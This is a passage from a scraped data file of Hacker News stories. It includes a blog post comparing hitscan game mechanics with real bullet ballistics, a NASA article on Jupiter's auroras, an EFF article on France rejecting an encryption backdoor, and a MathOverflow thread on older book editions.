cover or concealment2. So while you’re busy plugging enemies on the far side, they’re busy finding and shooting you, which gives the map its cruel charm.\n\nToday’s post isn’t about the ins and outs of sniper tactics and techniques, mainly because I’m unqualified in this area and can only give second-hand experiences. Suffice to say that camouflage and concealment are just as important as marksmanship for a sniper team.\n\nBut I want to focus more on the weapon itself: the UT Sniper Rifle:\n\nThere are plenty of these beauties and their and associated ammunition stashed throughout each tower, feeding the fuel of the famous sniper duels. Compared to the rest of the exotic UT arsenal, these seem unremarkable, boring even. They don’t fire bright bolts of plasma or glowing, exploding goo. They don’t cause big explosions. Even the shot’s report is dull and drab in comparison to the noises you get from more fanciful weapons like the Rocket Launcher or the Ripper.\n\nDon’t be fooled: this weapon is perhaps the most unrealistic of the lot. We’ll discuss why in the next section.\n\n…but only by ignoring the laws of physics\n\nUsing the Sniper Rifle in Facing Worlds, or any UT map, is very simple: right click to look down the telescopic sight, left click to fire:\n\nPoor Cilia can’t catch a break\n\nThis is a gameplay model of sniper rifles (or anything with a scope or sight) which is used in many other shooters. Aim, shoot, and hit (or miss). The game uses a simple model logic called “Hitscan” to determine whether each shot is a hit or not:\n\nThis is why bullets seem to cross the map instantly: the game models them that way. This, to state the obvious, is not how real-life bullets work. A real life-logic tree of whether a shot is a hit or a miss would look something like this:\n\nThis model was not something that the computer games of the 1990s were able to replicate, especially for rapid fire weapons. Add to this the complexity of multiplayer games, where PCs had to simulate gameplay and communicate and synchronise it across multiple machines over comparatively slow internet connections, and you can see why a simple model of bullet accuracy was preferable.\n\nThis began to change not long after the release of UT. Of course, modelling projectiles in video games was nothing new:\n\nSpace Invaders (1978): GIF from XanderBakker on Esri.\n\nBy the early 2000s, shooters were coming onto the market which modelled time of flight and bullet drop in a parabolic arc. Operation Flashpoint was a Cold War era West vs. East3 “realistic” shooter which featured large, open maps, actual squad tactics, driveable armoured vehicles, and simulated projectile parabolic arcs from the shooter to the target. Battlefield 1942 was a primarily multiplayer game pitting giant teams of soldiers against each other in large maps where the object was the gain and hold ground. It also featured a wide variety of driveable vehicles4 and the aforementioned parabolic modelling of bullet physics. Most of these game engines didn’t actually create a bullet as a physical object and model its travel through the air, rather, the engine did some clever math/maths5 to determine if the shot was a hit or miss and then modelled the damage appropriately.\n\nMax Payne (2001) and its 2003 sequel6 took firepower physics to a new level, modelling each bullet as an in-game physical object which interacted with other in-game objects (e.g., you, in-game baddies).\n\nGIF from TheErazerX via Steam Community\n\nTristan Jung gives an excellent summary of bullets in video games on Medium. As he explains, it’s not a simple case of increased computing power always leading to more complexity. Some of the most popular newer shooters such as the Call of Duty franchise still use Hitscan logic in their game engines:\n\nImage from Tristan Jung, How Do Bullets Work in Video Games?, via Medium\n\nWe’ll discuss the reasons for this in the next section.\n\nVideo games take shortcuts, but so does everyone\n\nIf we want to understand why game designers moved toward more complex models, one reason (at least with Max Payne and slow-motion bullet time) is for coolness. Slowing down time and making bullets more realistic can make gunfights far more satisfying and believable.\n\nA bigger part of the answer, however, is the aforementioned bigger, more open maps. Take a look at this screenshot from Battlefield 1942:\n\nImage from softonic. Note how far some of the targets are: hitscan would start to show its limitations here.\n\nWith bigger maps, the flight time of a projectile becomes a lot more important7. Conversely, it really doesn’t matter so much on smaller maps and over shorter distances, because the time lag and parabola effects of bullets at short ranges are negligible. There’s absolutely no point in modelling an effect which the player won’t notice.\n\nNo matter how much resources you throw at a simulation, it will only ever be an approximation to reality. Ammunition designers will employ teams of designers and supercomputers to create a simulation of the real-life fluid dynamics8 affecting a bullet in flight, and still fall short of reality:\n\nOriginal image from Reddit via u/alex9831. These types of pictures are called Schlieren photographs\n\nNo computer game will ever have the level of sophistication to model shockwaves, fluid dynamic effects, spin9, the Coriolis effect, and the Magnus effect. Don’t know what these are? Don’t worry, you’re not alone. Snipers and artillery gunners have heard of these things, but don’t need to worry about them every time they take a shot. This is because they have tables of data which approximate the real world sufficiently to the task in hand. Need to know what ammunition to use? There’s a table for that. What charge should the projectile be, and what bearing and elevation should we set the gun to10? There’s another table for that. What if it’s really warm or cold: does the change in air density make a difference? Sure does, and there’s another table for that. There are lots of tables (it’s all the one page in the links above), and they account for most reasonable scenarios within a reasonable degree of precision, but they do not represent the “true” physics governing the motion and explosion of the artillery round.\n\nA similar (but much simpler) table is below for a normal assault rifle round (.223″ Remington11, courtesy of and transcribed from Ammo.com). This shows roughly how fast the bullet is travelling at various distances, how long it takes to get there12, and how far the bullet drops in that time:\n\nRange (yards)Muzzle Velocity (fps)13Time (s)Elevation (inches)1002,9010.11.32002,5560.203002,2360.4-6.74001,9390.6-20.35001,6690.8-43.4\n\nA few things you might notice from the above:\n\nThe bullet falls a lot once it starts slowing down\n\nIt also seems to rise before it falls—wait, what’s that about?\n\nIt takes nearly a full second to travel half a kilometre\n\nHere’s a though experiment: imagine you fire a bullet on a horizontal axis and, at the same instant, drop an identical bullet from the same height. Which one hits the ground first?\n\nThe semi-surprising answer is that both hit the ground at exactly the same time. The fact that the fired bullet is travelling at nearly a kilometre per second horizontally doesn’t have a bearing on how gravity accelerates it in the vertical direction14. But when we’re teaching soldiers to shoot in the real world, we use a very simplified model. Rather than learn about the parabolic trajectory of the round, they learn to assume a flat trajectory and no bullet drop at the “zeroed” range, which in our case was 300 m15. For any distance closer than this, the bullet was said to “rise”, so the estimated point of impact at 100 m was 10 cm above the point of aim. That’s exactly what you see in the table above too, although they have assumed zeroing at 200 yards (metres).\n\nWe also teach soldiers to fire at the centre of mass of the target, i.e. the enemy soldier’s midsection. This means that a bullet “rise” of 10 cm would hit the upper chest or neck, still a probable lethal shot (ignore the focus on “headshots” you see in videogames and films: real soldiers go for the centre of mass.). This simplified version of reality allows us to account for the real-world effects of gravity with the minimum impact on a soldier’s perception of how his/her rifle works:\n\nGames which use hitscan mechanics might be taking a shortcut, but it’s one for which can forgive them. The effects aren’t likely to affect realism too much, and we take these shortcuts in real life as well.\n\nConclusion: All models are wrong; some models are useful\n\nAll models are wrong, but some models are useful\n\n—George Box (statistician, 1976)\n\nThe above quote is one of my favourite from my engineering university days. It applies to every branch of the sciences, and failure to appreciate its truth is one of the leading causes of ignorance. It means that no matter how hard we try to simulate the infinite complexity of the real world, we will fall short. If we accept this limitation, however, and are aware of the limitations of our model, then we might get to do something useful with it.\n\nHitscan mechanics in shooter games is a perfect example of this: it’s a model which works just fine in most cases and allows us to program games with very simple mathematical rules under the hood. Unreal Tournament is no exception: it’s hard to notice the limitations of its hitscan mechanics in what is for the most part a corridor shooter, with fast-paced, high-octane, close-range engagements. Enemies are rarely far enough away for bullet projectile physics to become important. Facing Worlds is an exception: the instantaneous flight time from rifle muzzle to enemy head is quite noticeable. This works, however, because it’s such a balanced map where the enemy has the very same advantages as you do.\n\nThe Sniper Rifle in UT is one of the most unrealistic weapons in the entire game, but its unrealism is subtle. Like everything UT-related, we will happily park our beloved but often pesky physics to one side for a few minutes while we grab a [magic] Sniper Rifle and revel in the low-gravity, high mortality asteroid that is Facing Worlds.\n\nThat’s all for this week folks, and I hope you enjoyed it. Please let me know what you think in the comments below. And don’t forget to subscribe using the link below if you haven’t done so already. Finally, please share this on your social media feeds of choice. Thanks for reading, and I’ll see you next week.\n\n\t\t\t\t\t\t\t\tType your email…\n\n\t\t\t\t\t\t\t\tSubscribe\n\nFacebook\n\nX\n\nWhatsApp\n\nReddit\n\nMail\n\nBluesky\n\nFeatured Image: The making of Facing Worlds, Unreal Tournament’s most popular map, Kyle Hoekstra, Rock Paper Shotgun\n\n“Capture the flag” (CTF) is a type of game where the goal is to fight your way to the heart of the opposing team’s base, steal their flag, and carry it back to your own flag to score a point. ↩︎The distinction is that “cover” is something that will stop a bullet, whereas “concealment” will not. Think “cover from fire” and “concealment from view.” ↩︎The distance in time between when this game was released (2001) and when it was set (1985) is much less than the period between when it was released and today (writing in 2025). Remember when Cold War-era conventional warfare against the Russians seemed like a relic of the past?  ↩︎Up to and including bomber aircraft and ships, leading to some very entertaining arcade-style gameplay. It’s funny how even “realistic” shooters like Flashpoint assume that tanks, trucks, and planes are just sitting there, waiting for a friend or foe to claim them and use them. It definitely makes these games more fun, but I shudder to think of the poor transport sergeant and quartermaster staring at a burning tank hulk after the battle and trying to reconcile the books. ↩︎Delete as applicable, depending on how much you love freedom. ↩︎Admittedly not first-person shooters, but third-person shooters. In an FPS, the player sees through the eyes of their in-game character and controls what they do. In a TPS, you control the character but also see what they do, from a viewpoint just above and behind them. TPS controls tend to be used for more character- or story-driven games (e.g. Max Payne), while in an FPS the main character tends to be more of a blank canvas for the player to mould/inhabit as they see fit (e.g. Deus Ex).   ↩︎Think about the <sigh> sniper scene from The Hurt Locker. As I’ve given them due credit for, the physics in this scene are on point. ↩︎Sorry if this is obvious, but air is a fluid. ↩︎Not to mention precession and nutation. ↩︎I won’t get into too much detail on this today, but charge, elevation, and bearing are the three things you need to know to get an artillery round to hit the target. Charge: how fast to send it down the barrel. Elevation: how high up to aim the barrel. Bearing: what direction to point it in. ↩︎Which is almost, but not quite exactly the same, as 5.56 x 45 mm NATO.   ↩︎This bit was an estimate on my part, based on the distance to be travelled and the average of the speed at that distance and the speed at the previous distance mark.  ↩︎This is short for “feet per second.” If you’re a European reader, you might be hyperventilating at this point. Pull yourself together and suppress the panic. It’s just an Imperial unit: you can still do maths with it, and it’s probably more afraid of you than you are of it. ↩︎You don’t need a rifle and a perfectly flat desert to test this theory. Get two identical balls and do the same: throw one horizontally and drop the other one, and you’ll see the same effect. ↩︎I assume different militaries zero their weapons to different ranges. You can zero a rifle to any range. For us, 300 m was the effective range of the rifle for an individual firer, so it made sense to zero our weapons to this range. ↩︎\n\nShare this:TwitterFacebookLike Loading…\n\n\t\tPublished by\n\n\t\tThe Director\n\n\t\t\tCategories: Firearms, Military technology, Science fiction, Weapons\n\n\t\t\tTags: Ballistics, Bullet, Capture the Flag, Facing Worlds, Hitscan, Projectile, Sniper Rifle, Trajectory, Unreal Tournament\n\n\t\t\t3 responses to “Magical instant bullets”\n\n\t\t\t\t\t\t\t\t\tFlak Cannons and shotguns – Military Realism Report\n\n\t\t\t\t\t\t\t\t\tMarch 20, 2025 at 8:50 am\n\n\t\t\t\t\t\t\t\t\t[…] Magical instant bullets >> […]\nLikeLike\n\n\t\t\t\t\t\t\t\t\tReply\n\n\t\t\t\t\t\t\t\t\tsapteuq\n\n\t\t\t\t\t\t\t\t\tMarch 22, 2025 at 10:59 pm\n\n\t\t\t\t\t\t\t\t\tI played all the games you mention and somehow never knew about hitscan!\nLikeLiked by 1 person\n\n\t\t\t\t\t\t\t\t\tReply\n\n\t\t\t\t\t\t\t\t\tThe Director\n\n\t\t\t\t\t\t\t\t\tMarch 22, 2025 at 11:45 pm\n\n\t\t\t\t\t\t\t\t\tI didn’t know much about it before doing my research for these articles. It’s a useful little shortcut. Sometimes you get an animation that represents a bullet or a tracer trail, but it’s just that: an animation. There are also algorithms, e.g. in Fortnite, which simulate the inaccuracy/variability of rapid fire weapons by randomly offsetting the “hits” to the left/right and up/down of the aiming point.\nLikeLike\n\n\t\t\t\t\t\t\t\t\tReply\n\n\t\tLeave a comment Cancel reply\n\n\t\t\tΔdocument.getElementById( \"ak_js_1\" ).setAttribute( \"value\", ( new Date() ).getTime() );",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3f8268237786294b",
    "title": {
      "en": "The polar vortex is hitting the brakes",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-hitting-brakes",
    "score": 209,
    "by": "bryanrasmussen",
    "time": 1742671898,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "877cfaddbe3399f5",
    "title": {
      "en": "Hubble Captures Vivid Auroras in Jupiter's Atmosphere (2016)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://science.nasa.gov/missions/hubble/hubble-captures-vivid-auroras-in-jupiters-atmosphere/",
    "score": 52,
    "by": "mooreds",
    "time": 1742426968,
    "content": "Explore HubbleScienceHubble Space TelescopeHubble Captures Vivid Auroras...Hubble HomeOverviewAbout HubbleThe History of HubbleHubble TimelineWhy Have a Telescope in Space?Hubble by the NumbersAt the MuseumFAQsImpact & BenefitsHubble's Impact & BenefitsScience ImpactsCultural ImpactTechnology BenefitsImpact on Human SpaceflightAstro Community ImpactsScienceHubble ScienceScience ThemesScience HighlightsScience Behind DiscoveriesHubble's Partners in ScienceUniverse UncoveredExplore the Night SkyObservatoryHubble ObservatoryHubble DesignMission OperationsMissions to HubbleHubble vs WebbTeamHubble TeamCareer AspirationsHubble AstronautsNewsHubble NewsHubble News ArchiveSocial MediaMedia ResourcesMultimediaMultimediaImagesVideosSonificationsPodcastse-BooksOnline ActivitiesLithographsFact SheetsPosters Hubble on the NASA AppGlossary More35th AnniversaryOnline Activities4 min readHubble Captures Vivid Auroras in Jupiter’s AtmosphereNASA Hubble Mission TeamGoddard Space Flight CenterJun 30, 2016   Article\n\nAstronomers are using NASA's Hubble Space Telescope to study auroras – stunning light shows in a planet's atmosphere – on the poles of the largest planet in the solar system, Jupiter. The auroras were photographed during a series of Hubble Space Telescope Imaging Spectrograph...\n\nAstronomers are using the NASA/ESA Hubble Space Telescope to study auroras — stunning light shows in a planet’s atmosphere — on the poles of the largest planet in the solar system, Jupiter. This observation program is supported by measurements made by NASA’s Juno spacecraft, currently on its way to Jupiter.\n\nJupiter, the largest planet in the solar system, is best known for its colorful storms, the most famous being the Great Red Spot. Now astronomers have focused on another beautiful feature of the planet, using Hubble's ultraviolet capabilities.\n\nThe extraordinary vivid glows shown in the new observations are known as auroras. They are created when high-energy particles enter a planet’s atmosphere near its magnetic poles and collide with atoms of gas. As well as producing beautiful images, this program aims to determine how various components of Jupiter’s auroras respond to different conditions in the solar wind, a stream of charged particles ejected from the sun.\n\nThis observation program is perfectly timed as NASA’s Juno spacecraft is currently in the solar wind near Jupiter and will enter the orbit of the planet in early July 2016. While Hubble is observing and measuring the auroras on Jupiter, Juno is measuring the properties of the solar wind itself; a perfect collaboration between a telescope and a space probe.\n\n“These auroras are very dramatic and among the most active I have ever seen”, said Jonathan Nichols from the University of Leicester, U.K., and principal investigator of the study. “It almost seems as if Jupiter is throwing a firework party for the imminent arrival of Juno.”\n\nTo highlight changes in the auroras Hubble is observing Jupiter almost daily for several months. Using this series of far-ultraviolet images from Hubble's Space Telescope Imaging Spectrograph, it is possible for scientists to create videos that demonstrate the movement of the vivid auroras, which cover areas bigger than Earth.\n\nNot only are the auroras huge in size, they are also hundreds of times more energetic than auroras on Earth. And, unlike those on Earth, they never cease. While on Earth the most intense auroras are caused by solar storms — when charged particles rain down on the upper atmosphere, excite gases and cause them to glow red, green and purple — Jupiter has an additional source for its auroras.\n\nThe strong magnetic field of the gas giant grabs charged particles from its surroundings. This includes not only the charged particles within the solar wind but also the particles thrown into space by its orbiting moon Io, known for its numerous and large volcanoes.\n\nThe new observations and measurements made with Hubble and Juno will help to better understand how the sun and other sources influence auroras. While the observations with Hubble are still ongoing and the analysis of the data will take several more months, the first images and videos are already available and show the auroras on Jupiter’s north pole in their full beauty.\n\nThe Jet Propulsion Laboratory (JPL) in Pasadena, California, manages the Juno mission for Southwest Research Institute in San Antonio, Texas. Juno is part of NASA's New Frontiers Program, which is managed at NASA's Marshall Space Flight Center in Huntsville, Alabama, for NASA's Science Mission Directorate in Washington, D.C. Lockheed Martin Space Systems, Denver, built the spacecraft. The California Institute of Technology in Pasadena manages JPL for NASA.\n\nThe Hubble Space Telescope is a project of international cooperation between NASA and the European Space Agency. NASA's Goddard Space Flight Center in Greenbelt, Maryland, manages the telescope. The Space Telescope Science Institute (STScI) in Baltimore, Maryland, conducts Hubble science operations. STScI is operated for NASA by the Association of Universities for Research in Astronomy (AURA) in Washington, D.C.\n\n\t\t\t\tRelated Images & Videos\n\n\t\t\t\t\t\t\t\tAuroras on Jupiter\n\n\t\t\t\t\t\t\t\tAstronomers are using NASA's Hubble Space Telescope to study auroras – stunning light shows in a planet's atmosphere – on the poles of the largest planet in the solar system, Jupiter. The auroras were photographed during a series of Hubble Space Telescope Imaging Spectrograph...\n\n\t\t\t\t\t\t\t\tJupiter WFC3/UVIS\n\n\t\t\t\t\t\t\t\tThis visible-light image of Jupiter was taken with the Wide Field Camera 3 aboard NASA's Hubble Space Telescope on April 21, 2014.\n\n\t\t\t\t\t\t\t\tScale and Compass Image for Jupiter Aurora\n\n\t\t\t\t\t\t\t\tHubble Time-Lapse of Aurora on Jupiter (May 19, 2016)\n\n\t\t\t\t\t\t\t\tThis time-lapse video of the vivid auroras in Jupiter's atmosphere was created using far-ultraviolet-light observations made on May 19, 2016, with the Space Telescope Imaging Spectrograph aboard NASA's Hubble Space Telescope. Hubble is particularly suited to observing and...\n\n\t\t\t\t\t\t\t\tHubble Time-Lapse of Aurora on Jupiter (June 2, 2016)\n\n\t\t\t\t\t\t\t\tThis time-lapse video of the vivid auroras in Jupiter's atmosphere was created using far-ultraviolet-light observations made on June 2, 2016, with the Space Telescope Imaging Spectrograph aboard NASA's Hubble Space Telescope. Hubble is particularly suited to observing and...\n\n\t\t\t\t\t\t\t\tHubble Tracks Bright Auroras on Jupiter (Composite Video Sequence 1)\n\n\t\t\t\t\t\t\t\tThis composite video illustrates the auroras on Jupiter relative to their position on the giant planet. As on Earth, auroras are produced by the interaction of a planet's magnetic field with its atmosphere. The Jupiter auroras observed by NASA's Hubble Space Telescope are some...\n\n\t\t\t\t\t\t\t\tHubble Tracks Bright Auroras on Jupiter (Composite Video Sequence 2)\n\n\t\t\t\t\t\t\t\tThis composite video illustrates the auroras on Jupiter relative to their position on the giant planet. As on Earth, auroras are produced by the interaction of a planet's magnetic field with its atmosphere. The Jupiter auroras observed by NASA's Hubble Space Telescope are some...\n\n\t\t\t\t\tShare\n\n\t\t\t\t\tDetails\n\n\t\t\t\t\t\tLast Updated\n\n\t\t\t\t\tMar 20, 2025\n\n\t\t\tLocationNASA Goddard Space Flight Center\n\n\t\t\t\t\t\t\tContact\n\n\t\t\t\t\t\tMediaClaire Andreoli\nNASA’s Goddard Space Flight Center\nGreenbelt, Maryland\nclaire.andreoli@nasa.gov\n\n\t\t\t\t\t\t\tCredits\n\n\t\t\t\t\t\tNASA, ESA, and J. Nichols (University of Leicester);\nAcknowledgment: A. Simon (NASA/GSFC) and the OPAL team\n\n\tRelated TermsHubble Space TelescopeAstrophysicsExoplanet AtmosphereGoddard Space Flight CenterJupiterPlanetary Environments & AtmospheresPlanetsThe Solar System\n\t\t\t\t\t\tRelated Links and Documents\n\nHubble-Europe’s Release\nNASA’s Hubble Portal\n\n\t\t\t\t\tKeep Exploring\n\t\t\t\t\tDiscover More Topics From Hubble\n\n\t\t\t\t\t\t\t\tHubble Space Telescope\n\n\t\t\t\t\t\t\tSince its 1990 launch, the Hubble Space Telescope has changed our fundamental understanding of the universe.\n\n\t\t\t\t\t\t\t\tHubble Science Highlights\n\n\t\t\t\t\t\t\t\tHubble Images\n\n\t\t\t\t\t\t\t\tHubble News",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "79d3b9dd2357223c",
    "title": {
      "en": "Blue Ghost lander captures sunset shots on moon before falling silent",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://phys.org/news/2025-03-blue-ghost-lander-captures-stunning.html",
    "score": 83,
    "by": "pseudolus",
    "time": 1742381137,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2bfa44bc1d84798a",
    "title": {
      "en": "Trapping misbehaving bots in an AI Labyrinth",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.cloudflare.com/ai-labyrinth/",
    "score": 147,
    "by": "pabs3",
    "time": 1742391067,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d209cefdecea71a4",
    "title": {
      "en": "Monster Cables picked the wrong guy to threaten (2008)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.oncontracts.com/monster-cables-picked-the-wrong-guy-to-threaten/",
    "score": 526,
    "by": "wallflower",
    "time": 1742603437,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2927e58e39ce09ff",
    "title": {
      "en": "Frink",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://frinklang.org/",
    "score": 212,
    "by": "lisper",
    "time": 1742585957,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "37cdc755902b21bc",
    "title": {
      "en": "France rejects backdoor mandate",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.eff.org/deeplinks/2025/03/win-encryption-france-rejects-backdoor-mandate",
    "score": 955,
    "by": "hn_acker",
    "time": 1742589311,
    "content": "In a moment of clarity after initially moving forward a deeply flawed piece of legislation, the French National Assembly has done the right thing: it rejected a dangerous proposal that would have gutted end-to-end encryption in the name of fighting drug trafficking. Despite heavy pressure from the Interior Ministry, lawmakers voted Thursday night (article in French) to strike down a provision that would have forced messaging platforms like Signal and WhatsApp to allow hidden access to private conversations.\nThe vote is a victory for digital rights, for privacy and security, and for common sense.\nThe proposed law was a surveillance wishlist disguised as anti-drug legislation. Tucked into its text was a resurrection of the widely discredited \"ghost” participant model—a backdoor that pretends not to be one. Under this scheme, law enforcement could silently join encrypted chats, undermining the very idea of private communication. Security experts have condemned the approach, warning it would introduce systemic vulnerabilities, damage trust in secure communication platforms, and create tools ripe for abuse.\nThe French lawmakers who voted this provision down deserve credit. They listened—not only to French digital rights organizations and technologists, but also to basic principles of cybersecurity and civil liberties. They understood that encryption protects everyone, not just activists and dissidents, but also journalists, medical professionals, abuse survivors, and ordinary citizens trying to live private lives in an increasingly surveilled world.\nA Global Signal\nFrance’s rejection of the backdoor provision should send a message to legislatures around the world: you don’t have to sacrifice fundamental rights in the name of public safety. Encryption is not the enemy of justice; it’s a tool that supports our fundamental human rights, including the right to have a private conversation. It is a pillar of modern democracy and cybersecurity.\nAs governments in the U.S., U.K., Australia, and elsewhere continue to flirt with anti-encryption laws, this decision should serve as a model—and a warning. Undermining encryption doesn’t make society safer. It makes everyone more vulnerable.\nThis victory was not inevitable. It came after sustained public pressure, expert input, and tireless advocacy from civil society. It shows that pushing back works. But for the foreseeable future, misguided lobbyists for police national security agencies will continue to push similar proposals—perhaps repackaged, or rushed through quieter legislative moments.\nSupporters of privacy should celebrate this win today. Tomorrow, we will continue to keep watch.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ea2f6177642e30ce",
    "title": {
      "en": "Can people be persuaded not to believe disinformation?",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.economist.com/science-and-technology/2025/03/19/can-people-be-persuaded-not-to-believe-disinformation",
    "score": 7,
    "by": "helsinkiandrew",
    "time": 1742715321,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3b3c55c45954d360",
    "title": {
      "en": "Older editions of which books were better than the new ones? (2010)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://mathoverflow.net/questions/29710/older-editions-of-which-books-were-better-than-the-new-ones",
    "score": 25,
    "by": "susam",
    "time": 1742678499,
    "content": "Older editions of which books were better than the new ones? [closed]\n\n        Ask Question\n\n                        Asked\n                        14 years, 9 months ago\n\n                        Modified\n                        14 years, 9 months ago\n\n                        Viewed\n                        4k times\n\n        This question shows research effort; it is useful and clear\n\n5\n\nSave this question.\n\n    Show activity on this post.\n\n    \\begingroup\n\n                                As it currently stands, this question is not a good fit for our Q&A format. We expect answers to be supported by facts, references, or expertise, but this question will likely solicit debate, arguments, polling, or extended discussion. If you feel that this question can be improved and possibly reopened, visit the help center for guidance.\n\n                Closed 14 years ago.\n\nWhen choosing some mathematics book to study, is it always the case that one should look for the current edition of the book. Are there any examples when the older edition of some book is clearly better than the latest version?\n\n                    booksbig-list\n\n            ShareShare a link to this question Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this question\n\n                        Follow\n\n                    Follow this question to receive notifications\n\n            asked Jun 27, 2010 at 14:30\n\n            community wiki\n\n        user2242\n\n    \\endgroup\n\n            4\n\n                \\begingroup\n                I'd be curious what anyone has to say about Fulton's Algebraic Curves.  It seems to me that earlier versions cover considerably more material than the current version, which is pretty streamlined.\n                \\endgroup\n\n–Qiaochu Yuan\n\n                    Commented\n                    Jun 27, 2010 at 17:10\n\n                    1\n\n                \\begingroup\n                This question now has a meta thread - tea.mathoverflow.net/discussion/476/…\n                \\endgroup\n\n–François G. Dorais\n\n                    Commented\n                    Jun 27, 2010 at 17:17\n\n                    1\n\n                \\begingroup\n                How do I vote to reopen this question? I think it is very useful to know (and not at all subjective) when a new edition omits sections of the old, changes notation, introduces new errors, etc.\n                \\endgroup\n\n–John Stillwell\n\n                    Commented\n                    Jun 27, 2010 at 23:24\n\n                \\begingroup\n                John, I've copied your comment to the meta discussion.\n                \\endgroup\n\n–Victor Protsak\n\n                    Commented\n                    Jun 28, 2010 at 10:48\n\n                        Add a comment\n                    |\n\n                                        4 Answers\n                                    4\n\n            Sorted by:\n\n            Reset to default\n\n                        Highest score (default)\n\n                        Date modified (newest first)\n\n                        Date created (oldest first)\n\n        This answer is useful\n\n8\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nUsually a newer edition is something that at least the author and publisher considered an improvement, so any answers are rather subjective. That said,\n\nIan Stewart's Galois Theory, 3rd edition, is sometimes harshly criticized for ruining a great book, by (1) doing everything over the complex numbers first (leading to some long-winded proofs), and (2) being full of typos. The former is a conscious choice of the author, so its merits are debatable, but at any rate it's a substantially different book from the 2nd edition.\nCalculus Made Easy, by Silvanus P. Thompson. This 1910 classic was updated in 1998 by Martin Gardner, but because both the authors are \"men of strong individuality\", the difference in styles can be somewhat jarring. Also, John Baez complains that:\n\n  Alas, the new edition has been puffed up to 336 pages by Martin Gardener. People must want calculus to seem hard.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 16:59\n\n            community wiki\n\n        shreevatsa\n\n    \\endgroup\n\n                3\n\n                    1\n\n                \\begingroup\n                Stewart's Galois Theory was the first book that came to my mind when I saw the question, and for exactly the reasons stated.\n                \\endgroup\n\n–Gerry Myerson\n\n                    Commented\n                    Jun 27, 2010 at 23:26\n\n                    2\n\n                \\begingroup\n                What about the Galois Theory 4th edition (2015)? Better or worse?\n                \\endgroup\n\n–user94750\n\n                    Commented\n                    Nov 11, 2018 at 2:25\n\n                \\begingroup\n                @KennyLJ sorry, I don't know\n                \\endgroup\n\n–shreevatsa\n\n                    Commented\n                    Nov 11, 2018 at 2:43\n\n                        Add a comment\n                    |\n\n        This answer is useful\n\n5\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nHausdorff's book Mengenlehre in the first edition had an appendix, omitted in subsequent editions,  on the Banach paradox.  (Later made into the Banach-Tarski paradox by Tarski...)  Someone once told me this was the best, most elementary, presentation of it -- I haven't compared different versions of the proof myself.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 18:27\n\n            community wiki\n\n        Gerald Edgar\n\n    \\endgroup\n\n                1\n\n                    1\n\n                \\begingroup\n                Strictly speaking, it's the Hausdorff paradox in the first edition of Mengenlehre (the one about the sphere, rather than the ball). I wouldn't say that it's technically the simplest presentation, because it uses the modular group rather than a free group, but still it is a big disappointment that it was omitted from later editions.\n                \\endgroup\n\n–John Stillwell\n\n                    Commented\n                    Jun 28, 2010 at 0:18\n\n                        Add a comment\n                    |\n\n        This answer is useful\n\n2\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nIan Stewart, Galois theory.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 14:48\n\n        RandomblueRandomblue\n\n            2,97777 gold badges3535 silver badges3838 bronze badges\n\n    \\endgroup\n\n                2\n\n                    3\n\n                \\begingroup\n                Any chance you could elaborate on why the older edition is better?\n                \\endgroup\n\n–Charles Siegel\n\n                    Commented\n                    Jun 27, 2010 at 15:08\n\n                \\begingroup\n                @CharlesSiegel Personally, when I was studying Galois theory, I found the second edition better because it matched my course. We did things over fields of any characteristic, not just characteristic 000, which is what the third edition focuses on. On the one hand a lot of examples were from polynomials over QQ\\Bbb Q, but you actually miss out on what strange things can happen over finite fields if you don't consider them. While the end goal might be to look at solubility by radicals, it doesn't hurt to state things over a general field, except possibly to modify a proof or two.\n                \\endgroup\n\n–snulty\n\n                    Commented\n                    Jul 1, 2016 at 12:32\n\n                        Add a comment\n                    |\n\n        This answer is useful\n\n1\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nThis kind of thing is very subjective, but in my opinion the third edition of Computability and Logic by Boolos and Jeffrey is better than the fourth, at least from the point of view of someone interested in the advanced topics (as opposed to a student encountering the material for the first time).  Some of the more interesting advanced topics were cut from the fourth edition.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 17:35\n\n            community wiki\n\n        Timothy Chow\n\n    \\endgroup\n\n                1\n\n                \\begingroup\n                The fourth edition had acquired a new author....\n                \\endgroup\n\n–Robin Chapman\n\n                    Commented\n                    